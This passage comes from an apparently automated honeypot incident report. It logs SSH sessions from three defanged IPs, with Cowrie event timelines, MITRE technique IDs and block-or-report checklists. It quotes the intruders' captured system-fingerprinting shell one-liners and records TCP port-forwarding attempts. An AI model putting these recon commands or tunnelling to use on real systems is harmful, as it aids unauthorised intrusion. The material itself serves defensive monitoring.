| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:36:48` | `cowrie.session.connect` |
| `2026-08-30 12:36:48` | `cowrie.client.version` |
| `2026-08-30 12:36:48` | `cowrie.client.kex` |
| `2026-08-30 12:36:49` | `cowrie.login.success` |
| `2026-08-30 12:36:51` | `cowrie.session.params` |
| `2026-08-30 12:36:51` | `cowrie.command.input` |
| `2026-08-30 12:36:51` | `cowrie.command.input` |
| `2026-08-30 12:36:51` | `cowrie.command.input` |
| `2026-08-30 12:36:51` | `cowrie.command.input` |
| `2026-08-30 12:36:51` | `cowrie.command.input` |
| `2026-08-30 12:36:51` | `cowrie.command.success` |
| `2026-08-30 12:36:51` | `cowrie.command.input` |
| `2026-08-30 12:36:51` | `cowrie.command.input` |
| `2026-08-30 12:36:51` | `cowrie.command.input` |
| `2026-08-30 12:36:51` | `cowrie.command.input` |
| `2026-08-30 12:36:51` | `cowrie.log.closed` |
| `2026-08-30 12:36:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96f1a1b9a699

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:38 |
| **Last Seen** | 2026-08-30 12:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:38:36` | `cowrie.session.connect` |
| `2026-08-30 12:38:36` | `cowrie.client.version` |
| `2026-08-30 12:38:36` | `cowrie.client.kex` |
| `2026-08-30 12:38:36` | `cowrie.login.success` |
| `2026-08-30 12:38:37` | `cowrie.session.params` |
| `2026-08-30 12:38:37` | `cowrie.command.input` |
| `2026-08-30 12:38:37` | `cowrie.log.closed` |
| `2026-08-30 12:38:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff781586a442

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:38 |
| **Last Seen** | 2026-08-30 12:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:38:37` | `cowrie.session.connect` |
| `2026-08-30 12:38:37` | `cowrie.client.version` |
| `2026-08-30 12:38:37` | `cowrie.client.kex` |
| `2026-08-30 12:38:39` | `cowrie.login.success` |
| `2026-08-30 12:38:40` | `cowrie.session.params` |
| `2026-08-30 12:38:40` | `cowrie.command.input` |
| `2026-08-30 12:38:40` | `cowrie.command.input` |
| `2026-08-30 12:38:40` | `cowrie.command.input` |
| `2026-08-30 12:38:40` | `cowrie.command.input` |
| `2026-08-30 12:38:40` | `cowrie.command.input` |
| `2026-08-30 12:38:40` | `cowrie.command.success` |
| `2026-08-30 12:38:40` | `cowrie.command.input` |
| `2026-08-30 12:38:40` | `cowrie.command.input` |
| `2026-08-30 12:38:40` | `cowrie.command.input` |
| `2026-08-30 12:38:40` | `cowrie.command.input` |
| `2026-08-30 12:38:41` | `cowrie.log.closed` |
| `2026-08-30 12:38:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a58a0825d89

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:40 |
| **Last Seen** | 2026-08-30 12:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:40:19` | `cowrie.session.connect` |
| `2026-08-30 12:40:19` | `cowrie.client.version` |
| `2026-08-30 12:40:19` | `cowrie.client.kex` |
| `2026-08-30 12:40:21` | `cowrie.login.success` |
| `2026-08-30 12:40:23` | `cowrie.session.params` |
| `2026-08-30 12:40:23` | `cowrie.command.input` |
| `2026-08-30 12:40:23` | `cowrie.command.input` |
| `2026-08-30 12:40:23` | `cowrie.command.input` |
| `2026-08-30 12:40:23` | `cowrie.command.input` |
| `2026-08-30 12:40:23` | `cowrie.command.input` |
| `2026-08-30 12:40:23` | `cowrie.command.success` |
| `2026-08-30 12:40:23` | `cowrie.command.input` |
| `2026-08-30 12:40:23` | `cowrie.command.input` |
| `2026-08-30 12:40:23` | `cowrie.command.input` |
| `2026-08-30 12:40:23` | `cowrie.command.input` |
| `2026-08-30 12:40:24` | `cowrie.log.closed` |
| `2026-08-30 12:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9675ab2edcdd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:40 |
| **Last Seen** | 2026-08-30 12:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:40:53` | `cowrie.session.connect` |
| `2026-08-30 12:40:53` | `cowrie.client.version` |
| `2026-08-30 12:40:53` | `cowrie.client.kex` |
| `2026-08-30 12:40:54` | `cowrie.login.success` |
| `2026-08-30 12:40:55` | `cowrie.session.params` |
| `2026-08-30 12:40:55` | `cowrie.command.input` |
| `2026-08-30 12:40:55` | `cowrie.log.closed` |
| `2026-08-30 12:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afb53af2e972

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 12:41 |
| **Last Seen** | 2026-08-30 12:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:41:07` | `cowrie.session.connect` |
| `2026-08-30 12:41:07` | `cowrie.client.version` |
| `2026-08-30 12:41:07` | `cowrie.client.kex` |
| `2026-08-30 12:41:08` | `cowrie.login.success` |
| `2026-08-30 12:41:08` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:41:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 12:41:08` | `cowrie.direct-tcpip.data` |
| `2026-08-30 12:41:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb99707cbe16

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:42 |
| **Last Seen** | 2026-08-30 12:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:42:06` | `cowrie.session.connect` |
| `2026-08-30 12:42:06` | `cowrie.client.version` |
| `2026-08-30 12:42:06` | `cowrie.client.kex` |
| `2026-08-30 12:42:08` | `cowrie.login.success` |
| `2026-08-30 12:42:10` | `cowrie.session.params` |
| `2026-08-30 12:42:10` | `cowrie.command.input` |
| `2026-08-30 12:42:10` | `cowrie.command.input` |
| `2026-08-30 12:42:10` | `cowrie.command.input` |
| `2026-08-30 12:42:10` | `cowrie.command.input` |
| `2026-08-30 12:42:10` | `cowrie.command.input` |
| `2026-08-30 12:42:10` | `cowrie.command.success` |
| `2026-08-30 12:42:10` | `cowrie.command.input` |
| `2026-08-30 12:42:10` | `cowrie.command.input` |
| `2026-08-30 12:42:10` | `cowrie.command.input` |
| `2026-08-30 12:42:10` | `cowrie.command.input` |
| `2026-08-30 12:42:10` | `cowrie.log.closed` |
| `2026-08-30 12:42:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a037638c2cd2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:43 |
| **Last Seen** | 2026-08-30 12:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:43:08` | `cowrie.session.connect` |
| `2026-08-30 12:43:08` | `cowrie.client.version` |
| `2026-08-30 12:43:08` | `cowrie.client.kex` |
| `2026-08-30 12:43:09` | `cowrie.login.success` |
| `2026-08-30 12:43:10` | `cowrie.session.params` |
| `2026-08-30 12:43:10` | `cowrie.command.input` |
| `2026-08-30 12:43:10` | `cowrie.log.closed` |
| `2026-08-30 12:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f5f1f19aad9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:43 |
| **Last Seen** | 2026-08-30 12:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:43:56` | `cowrie.session.connect` |
| `2026-08-30 12:43:56` | `cowrie.client.version` |
| `2026-08-30 12:43:56` | `cowrie.client.kex` |
| `2026-08-30 12:43:58` | `cowrie.login.success` |
| `2026-08-30 12:43:59` | `cowrie.session.params` |
| `2026-08-30 12:43:59` | `cowrie.command.input` |
| `2026-08-30 12:43:59` | `cowrie.command.input` |
| `2026-08-30 12:43:59` | `cowrie.command.input` |
| `2026-08-30 12:43:59` | `cowrie.command.input` |
| `2026-08-30 12:43:59` | `cowrie.command.input` |
| `2026-08-30 12:43:59` | `cowrie.command.success` |
| `2026-08-30 12:43:59` | `cowrie.command.input` |
| `2026-08-30 12:43:59` | `cowrie.command.input` |
| `2026-08-30 12:43:59` | `cowrie.command.input` |
| `2026-08-30 12:43:59` | `cowrie.command.input` |
| `2026-08-30 12:44:00` | `cowrie.log.closed` |
| `2026-08-30 12:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f34584108f2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 12:44 |
| **Last Seen** | 2026-08-30 12:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:44:13` | `cowrie.session.connect` |
| `2026-08-30 12:44:13` | `cowrie.client.version` |
| `2026-08-30 12:44:13` | `cowrie.client.kex` |
| `2026-08-30 12:44:14` | `cowrie.login.success` |
| `2026-08-30 12:44:14` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:44:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 12:44:14` | `cowrie.direct-tcpip.data` |
| `2026-08-30 12:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d1497435658

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:45 |
| **Last Seen** | 2026-08-30 12:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:45:22` | `cowrie.session.connect` |
| `2026-08-30 12:45:22` | `cowrie.client.version` |
| `2026-08-30 12:45:22` | `cowrie.client.kex` |
| `2026-08-30 12:45:23` | `cowrie.login.success` |
| `2026-08-30 12:45:23` | `cowrie.session.params` |
| `2026-08-30 12:45:23` | `cowrie.command.input` |
| `2026-08-30 12:45:23` | `cowrie.log.closed` |
| `2026-08-30 12:45:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ae74f019a0b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:45 |
| **Last Seen** | 2026-08-30 12:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:45:51` | `cowrie.session.connect` |
| `2026-08-30 12:45:51` | `cowrie.client.version` |
| `2026-08-30 12:45:51` | `cowrie.client.kex` |
| `2026-08-30 12:45:52` | `cowrie.login.success` |
| `2026-08-30 12:45:54` | `cowrie.session.params` |
| `2026-08-30 12:45:54` | `cowrie.command.input` |
| `2026-08-30 12:45:54` | `cowrie.command.input` |
| `2026-08-30 12:45:54` | `cowrie.command.input` |
| `2026-08-30 12:45:54` | `cowrie.command.input` |
| `2026-08-30 12:45:54` | `cowrie.command.input` |
| `2026-08-30 12:45:54` | `cowrie.command.success` |
| `2026-08-30 12:45:54` | `cowrie.command.input` |
| `2026-08-30 12:45:54` | `cowrie.command.input` |
| `2026-08-30 12:45:54` | `cowrie.command.input` |
| `2026-08-30 12:45:54` | `cowrie.command.input` |
| `2026-08-30 12:45:54` | `cowrie.log.closed` |
| `2026-08-30 12:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8766f444d044

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:47 |
| **Last Seen** | 2026-08-30 12:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:47:43` | `cowrie.session.connect` |
| `2026-08-30 12:47:43` | `cowrie.client.version` |
| `2026-08-30 12:47:43` | `cowrie.client.kex` |
| `2026-08-30 12:47:43` | `cowrie.login.success` |
| `2026-08-30 12:47:44` | `cowrie.session.params` |
| `2026-08-30 12:47:44` | `cowrie.command.input` |
| `2026-08-30 12:47:44` | `cowrie.log.closed` |
| `2026-08-30 12:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a512f7d0e66

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:47 |
| **Last Seen** | 2026-08-30 12:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:47:47` | `cowrie.session.connect` |
| `2026-08-30 12:47:48` | `cowrie.client.version` |
| `2026-08-30 12:47:48` | `cowrie.client.kex` |
| `2026-08-30 12:47:49` | `cowrie.login.success` |
| `2026-08-30 12:47:50` | `cowrie.session.params` |
| `2026-08-30 12:47:50` | `cowrie.command.input` |
| `2026-08-30 12:47:50` | `cowrie.command.input` |
| `2026-08-30 12:47:50` | `cowrie.command.input` |
| `2026-08-30 12:47:50` | `cowrie.command.input` |
| `2026-08-30 12:47:50` | `cowrie.command.input` |
| `2026-08-30 12:47:50` | `cowrie.command.success` |
| `2026-08-30 12:47:50` | `cowrie.command.input` |
| `2026-08-30 12:47:50` | `cowrie.command.input` |
| `2026-08-30 12:47:50` | `cowrie.command.input` |
| `2026-08-30 12:47:50` | `cowrie.command.input` |
| `2026-08-30 12:47:50` | `cowrie.log.closed` |
| `2026-08-30 12:47:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4e74c40760b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:49 |
| **Last Seen** | 2026-08-30 12:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:49:40` | `cowrie.session.connect` |
| `2026-08-30 12:49:40` | `cowrie.client.version` |
| `2026-08-30 12:49:40` | `cowrie.client.kex` |
| `2026-08-30 12:49:41` | `cowrie.login.success` |
| `2026-08-30 12:49:42` | `cowrie.session.params` |
| `2026-08-30 12:49:42` | `cowrie.command.input` |
| `2026-08-30 12:49:42` | `cowrie.command.input` |
| `2026-08-30 12:49:42` | `cowrie.command.input` |
| `2026-08-30 12:49:42` | `cowrie.command.input` |
| `2026-08-30 12:49:42` | `cowrie.command.input` |
| `2026-08-30 12:49:42` | `cowrie.command.success` |
| `2026-08-30 12:49:42` | `cowrie.command.input` |
| `2026-08-30 12:49:42` | `cowrie.command.input` |
| `2026-08-30 12:49:42` | `cowrie.command.input` |
| `2026-08-30 12:49:42` | `cowrie.command.input` |
| `2026-08-30 12:49:42` | `cowrie.log.closed` |
| `2026-08-30 12:49:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd80bd664c33

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 12:50 |
| **Last Seen** | 2026-08-30 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:50:01` | `cowrie.session.connect` |
| `2026-08-30 12:50:01` | `cowrie.client.version` |
| `2026-08-30 12:50:01` | `cowrie.client.kex` |
| `2026-08-30 12:50:01` | `cowrie.login.success` |
| `2026-08-30 12:50:02` | `cowrie.session.params` |
| `2026-08-30 12:50:02` | `cowrie.command.input` |
| `2026-08-30 12:50:02` | `cowrie.log.closed` |
| `2026-08-30 12:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91c2a408f808

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 12:50 |
| **Last Seen** | 2026-08-30 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 12:50:30` | `cowrie.session.connect` |
| `2026-08-30 12:50:30` | `cowrie.client.version` |
| `2026-08-30 12:50:30` | `cowrie.client.kex` |
| `2026-08-30 12:50:31` | `cowrie.login.success` |
| `2026-08-30 12:50:31` | `cowrie.direct-tcpip.request` |
| `2026-08-30 12:50:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 12:50:32` | `cowrie.direct-tcpip.data` |
| `2026-08-30 12:50:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c984c7e62a82

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 12:51 |
| **Last Seen** | 2026-08-30 12:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
